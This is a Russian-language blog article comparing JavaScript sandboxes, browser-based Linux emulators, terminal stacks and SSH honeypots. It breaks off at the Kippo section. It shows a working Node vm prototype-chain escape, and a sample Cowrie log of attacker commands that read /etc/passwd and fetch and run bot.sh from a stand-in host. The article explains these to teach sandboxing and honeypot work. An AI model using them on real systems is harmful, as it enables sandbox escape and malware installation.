# Каждая JavaScript-песочница, эмулятор, симулятор и honeypot Linux -- в сравнении

Так, я уже давно слишком глубоко в этой кроличьей норе. Всё началось потому, что я помогал с [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) -- проектом Fortune (вернусь к нему через секунду) -- и меня постоянно спрашивали "погоди, а в чём разница с `v86`?" или "почему не использовать `vm2`?" -- и я понял, что не могу дать чёткий ответ, не закартографировав сначала всю экосистему. Так что вот, добрались, видимо.

Оказывается, есть четыре отдельных семейства -- JS-песочницы, эмуляторы Linux, симуляторы Linux и honeypot -- и они почти никогда не пересекаются, хотя постоянно упоминаются в одной фразе. Кто-то, строящий систему плагинов, использует `isolated-vm`. Кто-то, делающий демо CLI-инструмента, использует `v86`. Кто-то, занимающийся threat intelligence по SSH, использует Cowrie. Они решают совершенно разные задачи под одним смутным зонтом "запустить код в коробке."

Я провёл много времени за чтением исходников, отчётов CVE, доков архитектуры и страниц npm, чтобы написать эту статью. Будет длинно -- возьми кофе, серьёзно. Или два.

> Маленький дисклеймер : `typescript-virtual-container` подсвечен в этой статье, потому что именно он запустил это исследование. Я старался быть честным ко всему остальному, но держи этот контекст в уме.

## Часть 0 -- Сначала, какую задачу ты реально решаешь?

Прежде чем нырять, стоит уточнить пользу каждого семейства, потому что терминология быстро становится кашеобразной, и люди постоянно всё мешают (я в том числе, пока не сел и не закартографировал всё чисто).

**JS-песочницы** изолируют код JavaScript от хостового процесса Node.js. Модель угрозы такая : ненадёжный JS-код, способный вызвать `process.exit()`, читать файлы или запускать дочерние процессы. Решение это граница вокруг исполнения V8. У этих инструментов нет понятия шелла Linux, файловой системы с правами или SSH.

**Эмуляторы Linux** крутят настоящее немодифицированное ядро Linux в эмуляторе CPU (x86, RISC-V, OR1K), реализованном на JavaScript или WebAssembly. Ты бутишь настоящую ОС. У тебя настоящие системные вызовы. У тебя бинарная совместимость с программами, скомпилированными под x86. Цена ресурсов огромна.

**Симуляторы Linux** имитируют *поведение* системы Linux, не крутя настоящее ядро. Они реализуют интерпретатор шелла, виртуальную файловую систему и достаточно семантики Unix, чтобы обмануть программы и людей. Без ядра, без Wasm, без эмуляции CPU. Куда меньше ресурсов.

**Honeypot** задуманы привлекать атакующих и записывать, что они делают. Это не в первую очередь среды исполнения -- это инструменты наблюдаемости. Верность реальному поведению Linux важна лишь настолько, насколько мешает атакующему детектить ловушку.

С этим фреймворком вот где находится каждый проект статьи :

```
JS sandbox :       vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
Эмулятор Linux :  v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
Симулятор Linux : typescript-virtual-container (единственный в этом пространстве)
Honeypot :         Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
Stack terminal :   xterm.js + node-pty (не изолятор, но смежно)
```

## Часть 1 -- JavaScript-песочницы

### 1.1 `vm` -- нативный модуль Node.js (не то, что думаешь)

Древнейший ответ на "выполнить ненадёжный JS" в Node это нативный модуль `vm`. Он с версии v0.1, так что многие сначала используют его -- и обжигаются.

```js
const vm = require("vm");
const sandbox = { answer: 0 };
vm.createContext(sandbox);
vm.runInContext("answer = 6 * 7", sandbox);
console.log(sandbox.answer); // 42
```

Что `vm` реально делает : создаёт новый контекст V8 (новый набор нативных конструкторов -- `Object`, `Array`, `Function` и т.д.) и исполняет код внутри, с общей ссылкой на то, что кладёшь в `sandbox`. Твой движок V8 не меняется. Твой процесс не меняется. Память общая.

Причина, по которой `vm` не даёт никакой безопасности : цепочка прототипов JavaScript это DAG, соединяющий всё с `Object.prototype`. Если кладёшь объект хостового мира в песочницу, гость может подняться по своей цепочке прототипов и достичь хостовых конструкторов. Из `Function` можно вызвать `Function("return process")()` и получить настоящий `process`. Game over. Как, сразу.

```js
// Это отлично работает в vm -- получаешь настоящий process
vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
```

В смысле, сама документация Node.js говорит : "Модуль vm не механизм безопасности. Не используй его для выполнения ненадёжного кода." Это предупреждение там всегда. Люди постоянно его игнорируют. Я видел продовые приложения, использующие `vm` как песочницу. Пожалуйста, не делай так.

**Вердикт** : механизм области видимости, а не песочница. Используй, когда надо изолировать переменные (движки шаблонов, функциональность типа `eval`, где контролируешь код). Никогда для ненадёжного входа.

**Память** : пренебрежимый оверхед -- тот же куча V8, что у хостового процесса.
**Безопасность** : никакой против мотивированного атакующего.

### 1.2 `vm2` -- общинная попытка и её очень долгая смерть

`vm2` был общинным ответом на проблему побега из `vm`. Центральная идея : оборачивать каждый объект, пересекающий границу песочницы, в `Proxy`, перехватывающий доступы к свойствам, блокирующий подъём прототипов и фильтрующий опасные ссылки. Умная идея в теории! На практике результат оказался куда менее убедителен, как увидим.

```js
const { VM } = require("vm2");
const vm = new VM({ timeout: 1000, sandbox: {} });
vm.run("process.exit(1)"); // бросает VMError, process недоступен
```

Несколько лет это довольно хорошо работало. Но поверхность атаки `Proxy` в JavaScript огромна. Каждая новая фича языка JS -- генераторы, асинхронные итераторы, `Symbol.toPrimitive`, `Error.prepareStackTrace`, внутренние слоты `Promise` -- потенциальный вектор обхода.

Хронология CVE это... нечто. Типа, смотри :

| Дата | CVE | Механизм |
|------|-----|-----------|
| Окт 2022 | CVE-2022-36067 | Побег из хостового контекста через `Error.prepareStackTrace` |
| Апр 2023 | CVE-2023-29017 | Утечка хостового объекта через необработанную async-ошибку |
| Апр 2023 | CVE-2023-29199 | Обход санации исключений через `handleException()` |
| Апр 2023 | CVE-2023-30547 | `Proxy.getPrototypeOf` → `Function` → RCE |
| Май 2023 | CVE-2023-32314 | `Proxy` на `Error.name` → `Function` → RCE |
| Июн 2023 | CVE-2023-37466 | Async-функция + переполнение стека + `Proxy.getPrototypeOf` |
| Июн 2023 | CVE-2023-37903 | Worker thread + побег через eval |

Три критические CVE в один месяц (апрель 2023). ТРИ. В ОДИН МЕСЯЦ. После CVE-2023-37903 мейнтейнер официально депрекейтнул библиотеку с сообщением : *"Библиотека содержит критические проблемы безопасности и не должна использоваться в проде."*

Мейнтейнер воскресил её в октябре 2025 версией 3.10.0, заявляя, что починил всё известное на тот момент. Новый критический побег (CVE-2026-22709, CVSS 9.8) был раскрыт в январе 2026, за ним пачка из ещё одиннадцати в мае 2026. Одиннадцать. Паттерн не изменился и честно не думаю, что когда-то изменится.

Фундаментальная проблема архитектурна -- и это урок, на усвоение которого у всей экосистемы ушло время. Нельзя построить безопасную песочницу на том же языке, что изолируешь, на том же движке, в том же процессе. Поверхность побега это вся реализация V8 -- а V8 это несколько миллионов строк C++, постоянно меняющихся. Каждая новая фича JS потенциально открывает новый путь атаки.

**Вердикт** : Не использовать для приложений, чувствительных к безопасности. Даже на последней версии новые обходы обнаруживаются каждые несколько месяцев. Сам мейнтейнер это открыто признал.

### 1.3 `isolated-vm` -- тот, что реально работает

`isolated-vm` выбирает правильный подход : использовать нативный примитив изоляции V8, Isolate. У каждого Isolate V8 своя куча, свой сборщик мусора, свой набор нативов и ноль общих ссылок с остальными Isolates.

Это та же граница, что Chrome использует между вкладками. Это настоящая барьера безопасности, а не языковой трюк на Proxy.

```js
import ivm from "isolated-vm";

// Каждый isolate это своя куча V8
const isolate = new ivm.Isolate({ memoryLimit: 64 }); // лимит в МБ
const context = await isolate.createContext();
const jail = context.global;

// Передача данных через границу требует явной сериализации
await jail.set("sensitiveData", "not this");
await jail.set("log", new ivm.Reference(console.log));

const script = await isolate.compileScript(`
  // Не может достичь хостового процесса, хостовой кучи или хостовых модулей
  log.applySync(undefined, ["hello from the isolate"]);
`);
await script.run(context);

// Можно жёстко завершать по таймауту или лимиту памяти
isolate.dispose(); // освобождает всю кучу
```

Типы `Reference` и `ExternalCopy` это явный коммуникационный мост. `Reference` даёт isolate вызываемый handle на хостовую функцию -- isolate может её звать, но не может инспектировать её замыкание или прототип. `ExternalCopy` сериализует значение (структурированный клон) через границу кучи. Эта модель явного моста неудобна, но именно она делает изоляцию реальной.

Можно задавать строгие лимиты ресурсов : память (isolate завершается при превышении лимита), таймаут wall-clock и таймаут CPU. Завершение реально -- оно убивает весь Isolate V8, а не просто JS-таймаут, обходимый через `while(true)`.

**Лимиты** : только JS. Нельзя исполнять bash внутри. Нет понятия файлов, прав, сети или процессов. Это ровно правильный инструмент для пользовательского JS (плагины, формулы, скриптовые хуки) и неправильный для всего остального. Автор `typescript-virtual-container` упоминала, что рассматривала его вначале, прежде чем поняла, что "выполнять шелл-команды" и "изолировать JavaScript" фундаментально разные задачи.

**Память** : ~3-10 МБ на пустой isolate, растёт с использованием кучи.
**Безопасность** : прочная. Граница V8 Isolate это настоящий примитив изоляции.
**npm** : [isolated-vm](https://www.npmjs.com/package/isolated-vm)
**GitHub** : [laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)

### 1.4 `quickjs-emscripten` -- отдельный JS-движок, скомпилированный в Wasm

Другой подход : вместо изоляции внутри V8 крутить полностью отдельный движок JavaScript, скомпилированный в WebAssembly. Хост крутится в V8/Node. Гость крутится в QuickJS-в-Wasm. Границу изоляции даёт песочница Wasm.

QuickJS это ещё одно творение Фабриса Беллара (того же парня за QEMU, FFmpeg, JSLinux, TinyEMU -- этот человек нереален, серьёзно, как один человек делает всё это?). Маленький соответствующий стандарту ES2023 движок JS, написанный на C, а скомпилированный в Wasm весит всего около 500 КБ.

```js
import { getQuickJS } from "quickjs-emscripten";

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = vm.evalCode(`
  // Исполняется в QuickJS, полностью отдельно от V8
  (function() { return 6 * 7; })()
`);

if (result.error) {
  console.log("Error:", vm.dump(result.error));
  result.error.dispose();
} else {
  console.log("Result:", vm.dump(result.value)); // 42
  result.value.dispose();
}

vm.dispose();
```

QuickJS это маленький соответствующий ES2023 движок JavaScript, написанный на C. Скомпилированный в Wasm, он весит около 500 КБ для синхронного варианта, ~1 МБ для асинхронного (Asyncify). Управление памятью ручное -- каждое значение, вытаскиваемое из VM, надо явно освобождать, что слегка бесит, но предотвращает сюрпризы межграничного GC. Забавный компромисс!

Обёртка `@sebastianwessel/quickjs` добавляет более эргономичный API сверху, с опциональной виртуальной файловой системой, поддержкой fetch и стабами нодовых модулей :

```ts
import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
import { loadQuickJs } from "@sebastianwessel/quickjs";

const { runSandboxed } = await loadQuickJs(variant);

const result = await runSandboxed(
  async ({ evalCode }) => evalCode(`
    import { join } from 'path';
    export default join('src', 'dist');
  `),
  { allowFs: false, allowFetch: false }
);
```

Модель безопасности отлична от `isolated-vm` : линейная модель памяти Wasm такова, что гость не может напрямую обращаться к объектам кучи V8. Поверхность атаки это интерфейс хост↔Wasm (imports/exports), а не весь язык JS. Обычно считается робастнее Proxy-песочниц.

Обратная сторона : QuickJS не оптимизирован как V8. На CPU-bound JS-нагрузках он в 5-20 раз медленнее V8. Для мелких кусков кода и ненадёжных вычислений это обычно неважно.

**Память** : ~500 КБ модуль Wasm + куча на инстанс.
**Безопасность** : граница Wasm, считается прочнее Proxy-подходов.
**npm** : [quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten), [@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)
**GitHub** : [justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)

### 1.5 Deno -- рантайм, ставящий разрешения первым

Deno выбирает совершенно другую философию : вместо песочницы внутри Node построить новый рантайм, безопасный по умолчанию. Мне правда нравится этот подход -- таким Node.js должен был быть с начала, честно. Райан Даль (оригинальный создатель Node.js) буквально создал Deno, потому что жалел об отдельных дизайн-решениях Node.js, что довольно дико, если подумать.

Каждая чувствительная способность (чтение файлов, запись файлов, сеть, окружение, субпроцессы) требует явного флага `--allow-*` :

```bash
# Этот может только читать в /data, ничего больше
deno run --allow-read=/data script.ts

# Этот может обращаться только к одному домену
deno run --allow-net=api.example.com script.ts

# Без флагов = никаких разрешений
deno run untrusted.ts # не может читать, писать, сеть, запускать
```

Модель разрешений реализована на уровне Rust/OS -- это не JS-трюк. Когда код Deno зовёт `Deno.readFile()`, это идёт через Rust-операцию, проверяющую таблицу разрешений до касания файловой системы. Обойти из JS нельзя, потому что системный вызов никогда не случается без выданного разрешения.

Для исполнения реально ненадёжного кода Deno Workers (Web Workers) дают второй isolate в том же процессе, каждый со своим набором разрешений. Можно запустить воркер с нулевыми разрешениями и общаться с ним через `postMessage`.

Deno 2 (вышедший в октябре 2024) добавил полную npm-совместимость и шимы совместимости Node.js, что значительно улучшило его принятие для серверных юзкейсов.

**Компромисс** : модель безопасности Deno отлична для кода, которому можно частично доверять. Для полностью ненадёжного кода, способного быть враждебным, модель разрешений не помогает -- нужна граница Isolate (`isolated-vm`) или другой движок (`quickjs-emscripten`), потому что Deno всё равно использует V8, а искусные атакующие могут находить баги уровня V8.

### 1.6 TC39 ShadowRealm -- стандартизированный ответ (однажды)

Орган стандартизации JavaScript (TC39) имеет предложение ShadowRealm, пытающееся стандартизировать то, что `vm` и `vm2` пытались делать, но с корректной моделью безопасности. ShadowRealm создаёт изолированный контекст исполнения JS со своими интринсиками, без доступа к внешнему миру и тщательно контролируемым интерфейсом импорта/экспорта.

```js
const realm = new ShadowRealm();
const result = realm.evaluate(`
  // Отдельные интринсики, нет доступа к внешнему миру
  typeof globalThis.fetch // "undefined"
  6 * 7 // 42
`);
```

ShadowRealm доступен в браузерах (Chrome 90+, Firefox 105+), но ещё не в стабильном Node.js в 2026. Предложение TC39 Compartments строится на нём для изоляции уровня модулей. Это долгосрочные стандартизированные ответы, но они ещё не готовы для серверного прода Node. Один из тех проектов, что видны издалека, но... просто ещё не здесь. Классика TC39.

### Резюме семейства песочниц

| | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
|---|---|---|---|---|---|
| **Граница изоляции** | никакая (область) | Proxy (сломан) | V8 Isolate | Wasm | V8 Isolate + Rust-разрешения |
| **Лимит памяти** | ❌ | ❌ | ✅ строгий лимит | ✅ куча Wasm | частично |
| **Таймаут CPU** | ❌ | ✅ (обходимый) | ✅ строгий | ✅ | ✅ |
| **Безопасность** | никакая | сломана | прочная | прочная | прочная |
| **Скорость JS** | нативный V8 | нативный V8 | нативный V8 | ~в 10 раз медленнее | нативный V8 |
| **Браузер** | ❌ | ❌ | ❌ | ✅ | ❌ |
| **Совместимость Node** | натив | ✅ | ✅ | частичные шимы | частичная |
| **Статус** | стабилен | рискован (новые CVE) | ✅ активен | ✅ активен | ✅ активен |
| **Оверхед RAM** | ~1 МБ | ~5-20 МБ | ~3-10 МБ | ~5-15 МБ | ~10-30 МБ |

Вердикт : если важна безопасность, есть ровно два настоящих варианта -- `isolated-vm` (нативное расширение, V8 Isolate, полная скорость JS) и `quickjs-emscripten` (Wasm, совместим с браузером, ~в 10 раз медленнее на интенсивных вычислениях). Всё остальное либо "пожалуйста, не делай так" (`vm`, `vm2`), либо рантайм, решающий совершенно другую задачу (Deno). ShadowRealm мог бы всё изменить однажды, но пока нет.

## Часть 2 -- Эмуляторы Linux на JavaScript

Здесь становится реально интересно для меня. Это *настоящие* эмуляторы -- они реализуют набор инструкций CPU на JavaScript или WebAssembly, бутят настоящий образ ядра Linux и исполняют настоящие пользовательские бинари. Изоляция идёт из того, что гость и хост ничего не разделяют : разные пространства памяти, разные потоки инструкций.

Цена огромна, но получаемое реально замечательно : настоящий Linux, реально крутящийся, в твоём браузере или процессе Node. Типа, это довольно дико, если подумать, нет?

### 2.1 `v86` -- эмулятор PC x86 на JS + JIT Wasm

`v86` от Fabrice (copy на GitHub) самый способный опенсорсный эмулятор x86 на JavaScript. Начался как чистый JS-интерпретатор около 2013 и эволюционировал в JIT-систему, где базовые блоки x86 транслируются в WebAssembly на лету, значительно улучшая производительность.

Что он эмулирует :
- **CPU** : x86-32 (IA-32), набор инструкций примерно уровня Pentium 1. 64-бит (x86-64) остаётся исключённым -- это материальный архитектурный лимит, а не недостающая фича.
- **FPU** : через `Float64Array` JavaScript. x87 в расширенной точности 80-бит ; JS-даблы в 64-бит. Это значит, что результаты флоатов могут слегка отличаться от настоящего CPU.
- **Память** : настраиваемая, маппится на `SharedArrayBuffer` или `ArrayBuffer` в куче JS.
- **Железо** : 8254 PIT (таймер), 8259 PIC (контроллер прерываний), контроллер клавиатуры 8042 (PS/2), CMOS RTC, VGA с расширениями SVGA и Bochs VBE, IDE-контроллер, контроллер дискет (8272A), сетевая карта NE2000.
- **BIOS** : использует SeaBIOS (опенсорсный x86 BIOS).

JIT работает, выявляя базовые блоки (последовательности инструкций x86 без прыжков), транслируя их в функцию WebAssembly, кэшируя эту функцию и вызывая её при следующих исполнениях того же блока. Горячие кодовые пути получают нативную Wasm-производительность. Холодные пути откатываются на JS-интерпретатор.

```js
import { V86 } from "v86";
import { readFileSync } from "fs";

const emulator = new V86({
  bios:    { buffer: readFileSync("./bios/seabios.bin") },
  vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
  hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
  memory_size: 128 * 1024 * 1024, // 128 МБ
  autostart: true,
});

// Захватить серийный вывод (консоль ядра Linux)
emulator.add_listener("serial0-output-byte", byte => {
  process.stdout.write(String.fromCharCode(byte));
});

// Отправить вход гостю (печатать в шелле)
emulator.serial0_send("ls /\n");
```

**Поддерживаемые ОС** : Alpine Linux (отлично), Ubuntu 16.04/18.04 (только i386), Arch Linux 32, ReactOS, FreeDOS, Windows 9x/2000 (с оговорками), MS-DOS.

**Время старта** : 15-40 секунд для Alpine Linux из чистого образа. Это присуще реальной инициализации ядра -- её нельзя пропустить. Да, твои пользователи будут смотреть, как ядро Linux бутится в их браузере. Таков дил.

**Минимум памяти** : 100-256 МБ на инстанс. Один Wasm JIT-кодкэш может достигать десятков МБ для занятого инстанса Linux.

**Использование в Node.js** : полностью поддерживается. DOM остаётся лишним -- VGA-вывод можно игнорировать, если интересен только серийный вывод.

**Чего нельзя делать** : исполнять 64-битные бинари, использовать современные фичи ядра (eBPF, io_uring и т.д.) или крутить больше горстки инстансов одновременно, не уперевшись в лимиты памяти.

**npm** : [v86](https://www.npmjs.com/package/v86) -- обновляется непрерывно, последняя публикация в тот же день на момент написания.
**GitHub** : [copy/v86](https://github.com/copy/v86)
**Демо** : [copy.sh/v86](https://copy.sh/v86)

### 2.2 JSLinux и TinyEMU -- работа Беллара, в два приёма

JSLinux это собственный эмулятор Linux на JavaScript от Фабриса Беллара -- самый первый, опубликованный в 2011. Я продолжаю упоминать Беллара в этой статье, потому что он не перестаёт всплывать : QuickJS, TinyEMU, JSLinux, QEMU, FFmpeg. Этот парень нечто другое. Реально один из впечатляющих индивидуальных технических вкладов в истории софта, без преувеличения.

Оригинальный JSLinux был чистым JS-интерпретатором x86. В 2016 Беллар написал TinyEMU (эмулятор RISC-V на C), скомпилировал его в JavaScript через Emscripten, и это стало базой текущего JSLinux. Так что текущий JSLinux это на деле C-код, генерирующий JavaScript -- вовсе не вручную написанный JS.

Технические заметки на сайте Беллара стоят прочтения : текущий JSLinux крутит CPU RISC-V 32 или 64-бит (не x86), эмулируя консоль VirtIO, сеть VirtIO, блочное устройство VirtIO и файловую систему 9P для шаринга файлов с хостом. JS-демо скомпилировано из C с использованием Emscripten -- это не вручную написанный JS.

Сам TinyEMU поддерживает :
- RISC-V RV32IMAFDQC и RV64IMAFDQC (32 и 64-бит, с флоатами, умножением, сжатыми инструкциями)
- x86 через KVM (только нативно, без эмуляции -- так что JS-версия только RISC-V)
- Консоль VirtIO, сеть, блок, ввод, файловая система 9P

У TinyEMU есть JavaScript-демо, поставляемое через Emscripten. Это база JSLinux, а также используется `container2wasm` (см. секцию 2.5).

**Статус JSLinux** : нет npm-пакета, нет программируемого API. Это демо, открываемое в браузере. Историческая важность велика -- оно доказало концепцию. Практическая польза как библиотеки : нулевая.

**TinyEMU** : нет на npm, исходник C доступен на [bellard.org/tinyemu](https://bellard.org/tinyemu/).

### 2.3 jor1k -- эмулятор OR1K

jor1k это эмулятор OpenRISC 1000 (OR1K), написанный на JavaScript Себастьяном Маке. Интересен исторически, потому что jor1k ввёл поддержку файловой системы VirtIO 9P, которую Беллар затем интегрировал в TinyEMU и JSLinux. Кросс-опыление между этими проектами плотное -- они все занимают идеи друг у друга, что честно одна из крутейших вещей в опенсорсной эмуляционной работе.

**Статус** : больше не поддерживается активно, нет npm-пакета. Заархивирован на этом этапе. Полезен знать в основном для исторического контекста -- типа если кто-то упомянет jor1k в разговоре, теперь ты знаешь, что это :)

### 2.4 CheerpX -- коммерческий x86-эмулятор для браузера

CheerpX от Leaning Technologies это коммерческий опенсорсный... нет, коммерческий production-качества эмулятор Linux x86. Он не опенсорсный, но заметно способнее v86 для прогона настоящего юзерспейса Debian/Ubuntu. Если нужен настоящий VSCode в браузере, это то, что надо.

Ключевые отличия от v86 :
- Поддерживает более широкий ISA (больше x86-расширений, лучше совместимость glibc)
- Файловая система на IndexedDB в браузере (персистентна между перезагрузками страницы)
- Поддержка pthread через `SharedArrayBuffer` (требующий заголовков COOP/COEP -- да, этих надоедливых заголовков безопасности)
- Задуман крутить VSCode, Python, Node.js и другие настоящие приложения -- а не только минимальные образы ОС
- Профессиональная поддержка и SLA доступны (aka можешь наорать на кого-то, если сломается)

Типичный юзкейс это "крутить настоящее Linux-приложение в браузере без сервера." Компании используют это для браузерных IDE, туториалов кодинга и интерактивной документации.

```js
// API CheerpX (упрощённо)
const cx = await CheerpX.Linux.create({
  mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
});
await cx.run("/bin/bash");
```

**История с Node.js** : CheerpX изначально задуман для браузера. Подлежащий эмулятор теоретически мог бы работать в Node (это Wasm), но API и документация целиком ориентированы на браузерное использование. Серверное использование не поддерживается.

**Память** : похоже на v86 -- 200+ МБ для настоящего инстанса Debian.
**Тарификация** : бесплатно для опенсорсных проектов, коммерческая лицензия для продового SaaS.
**Доки** : [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)

### 2.5 WebContainers (StackBlitz) -- Node.js в Wasm, а не эмуляция Linux

WebContainers часто кладут в одну кучу с эмуляторами Linux, но архитектурно они другие. Они не эмулируют x86. Они не бутят Linux. Они крутят Node.js, скомпилированный в WebAssembly, используя WASI. Это различие сильно считается, и я потратил слишком много времени, путаясь в этом.

Думаю, путаница идёт из маркетинга -- "крутить Node.js в твоём браузере" звучит как эмуляция, но на деле это сам Node.js, скомпилированный в Wasm, а не эмуляция Linux, крутящая Node.js в VM. Две совершенно разные архитектуры.

Архитектура :
1. Node.js скомпилирован в Wasm (кастомный WASI-рантайм конкретно)
2. Service Worker перехватывает сетевые запросы эмулированного сервера Node.js и роутит их во вкладку браузера
3. Файловая система живёт в памяти браузера (без дискового I/O)
4. npm это кастомная реализация, оптимизированная для браузерного использования

```js
import { WebContainer } from "@webcontainer/api";

const webcontainer = await WebContainer.boot();

// Писать файлы
await webcontainer.mount({
  "index.js": { file: { contents: `console.log("hello")` } },
  "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
});

// Выполнять команды Node.js
const proc = await webcontainer.spawn("node", ["index.js"]);
proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
```

Раз это исполняет настоящий Node.js (скомпилированный в Wasm), у тебя настоящий npm, настоящие API Node.js и настоящая резолюция модулей. У тебя нет обобщённого юзерспейса Linux -- нельзя ставить системные пакеты через `apt`, исполнять произвольные скомпилированные бинари или делать много чего вне экосистемы Node.js.

**Пререквизиты браузера** : SharedArrayBuffer (нужны заголовки COOP/COEP), поддержка Service Worker, современный Wasm.

**История с Node.js** : задуман исключительно для браузерного использования. API не работает вне браузерного контекста.

**npm** : [@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)
**Доки** : [webcontainers.io](https://webcontainers.io)

### 2.6 container2wasm -- Docker-контейнеры, скомпилированные в Wasm

`container2wasm` это инструмент (не npm-пакет) от NTT, берущий образ Docker-контейнера и конвертирующий его в бинарь WebAssembly, способный крутиться на любом Wasm-хосте -- включая браузер. Когда я впервые это увидел, реально не поверил, что работает.

Механизм :
- Для x86_64-контейнеров : встраивает Bochs (x86-эмулятор, скомпилированный в Wasm) + корневую файловую систему контейнера
- Для riscv64-контейнеров : встраивает TinyEMU (опять Беллар!) + корневую файловую систему контейнера
- Результирующий файл `.wasm` стартует эмулятор, монтирует файловую систему контейнера и исполняет точку входа контейнера

```bash
# Конвертировать контейнер Ubuntu 22.04 в Wasm
c2w ubuntu:22.04 out.wasm

# Выполнить его
wasmtime out.wasm uname -a
# Linux 5.15.0 #1 SMP riscv64 GNU/Linux

# Или отсервить для браузерного использования
c2w --to-js ubuntu:22.04 /tmp/htdocs/
```

Результирующий `.wasm` объёмист -- минимальная Ubuntu на несколько сотен МБ -- но полностью автономен. Можешь отправить `.wasm` кому-то по email, и он сможет крутить Ubuntu в своём браузере. Эта фраза не должна иметь смысла, но вот мы здесь.

**GitHub** : [container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)

## Часть 3 -- Стеки terminal : xterm.js и node-pty

Два пакета постоянно всплывают, когда люди строят шелл-подобные опыты. Это не песочницы и не эмуляторы -- это сантехника UI и PTY -- но они так смежны, что было бы неправильно их опустить. К тому же я использовал оба, и они реально хороши.

### 3.1 `xterm.js` -- рендер терминала

xterm.js это эмулятор терминала для браузера. Он показывает экран терминала (escape-последовательности VT100/xterm) в элементе `<canvas>`, управляет вводом клавиатуры и выставляет API для прокачки данных.

Используется : встроенным терминалом VS Code, Azure Cloud Shell, Proxmox VE, AWS CloudShell и многими другими.

```js
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

const term = new Terminal({ cursorBlink: true });
const fitAddon = new FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById("terminal"));
fitAddon.fit();

// Отправить данные в терминал (показаны как текст)
term.write("$ ");
term.onData(data => {
  // data это нажатия -- отправить на бэкенд
  socket.send(data);
});
socket.onmessage(msg => {
  // вывод бэкенда -- показать
  term.write(msg.data);
});
```

xterm.js это только слой рендера. Он не исполняет шелл. Он не интерпретирует команды. Это виджет отображения, подключаемый к бэкенду на выбор. Многие думают, что xterm.js "делает терминал", но на деле это просто экран -- всё равно надо подключить к чему-то, реально исполняющему команды.

**npm** : [@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)
**GitHub** : [xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)

---

### 3.2 `node-pty` -- создание PTY

`node-pty` создаёт псевдотерминал (PTY) в Node.js и даёт handle чтения/записи на нём. Использованный с xterm.js, он позволяет построить браузерный терминал, говорящий с настоящим шеллом (bash, zsh, fish), крутящимся на сервере.

```js
import * as pty from "node-pty";

const shell = pty.spawn("bash", [], {
  name: "xterm-color",
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env,
});

shell.onData(data => {
  // Отправить в браузерный xterm.js через WebSocket
  ws.send(data);
});

ws.on("message", data => {
  // Передать нажатия браузера в шелл
  shell.write(data);
});
```

Это стандартная схема для облачных IDE и веб-терминалов : xterm.js (браузер) ↔ WebSocket ↔ node-pty ↔ настоящий bash. Изоляция по-прежнему отсутствует. Шелл исполняется со всеми разрешениями процесса Node.js (или запускающего пользователя).

**Поддерживается** : Microsoft.
**npm** : [node-pty](https://www.npmjs.com/package/node-pty)
**GitHub** : [microsoft/node-pty](https://github.com/microsoft/node-pty)

## Часть 4 -- SSH-honeypot

Honeypot задуманы быть атакованными. Цель выглядеть достаточно реально, чтобы атакующие с ними взаимодействовали, записывая при этом всё, что они делают, для threat intelligence. SSH главная цель, потому что это самый атакуемый сервис в интернете -- если выставить порт 22 на публичном IP, увидишь автоматизированные попытки скана буквально за минуты. Попробуй однажды, довольно ужасает, как быстро это случается.

Качество honeypot меряется двумя вещами : **верностью** (насколько убедительно имитирует настоящий систему) и **телеметрией** (сколько полезных данных захватывает). Эти две вещи в напряжении. Высоковерный honeypot труднее строить и рискованнее оперировать.

Эта секция в итоге привела меня к постройке модуля `HoneyPot` в `typescript-virtual-container`, так что у меня тут есть мнения.

### 4.1 Cowrie -- золотой стандарт

Cowrie это SSH- и Telnet-honeypot средней-высокой интерактивности на Python. Самый развёртываемый SSH-honeypot в исследовательском и безопасностном сообществе.

Архитектура :
- **Слой протокола** : настоящая реализация протокола SSH (Twisted Conch), так что у атакующих настоящие хендшейки, настоящий обмен ключами, настоящая аутентификация
- **Слой шелла** : поддельная файловая система (похожая на Debian 5.0) и частичный интерпретатор шелла, отвечающий на распространённые команды
- **Режим прокси** : может перенаправлять на настоящую систему позади (режим высокой интерактивности), записывая всё проходящее
- **Режим LLM** (недавнее добавление) : использует языковую модель, чтобы генерировать динамические ответы на команды, которых не умеет -- да, у Cowrie теперь есть ИИ-режим. Живём в безумное время.

```python
# Что захватывает Cowrie
{
  "timestamp": "2024-01-15T03:22:11.847Z",
  "src_ip": "45.33.32.156",
  "username": "root",
  "password": "123456",
  "session": "abc123",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh"
  ],
  "files_downloaded": ["bot.sh"]
}
```

Cowrie сохраняет скачанные файлы (через wget/curl/SFTP/SCP) для анализа малвари. Интегрируется со Splunk, Elasticsearch и другими SIEM-платформами.

**Верность** : средне-высокая. Достаточно убедительно, чтобы дурить автоматизированных ботов (а это 99 % SSH-атакующих -- в основном просто тупые скрипты, пробующие `root`/`password`). Искусных людей оно может выдать по отпечатку, однако, обычно довольно быстро.

**Язык** : Python (Twisted)
**GitHub** : [cowrie/cowrie](https://github.com/cowrie/cowrie)

### 4.2 Kippo -- предшественник Cowrie

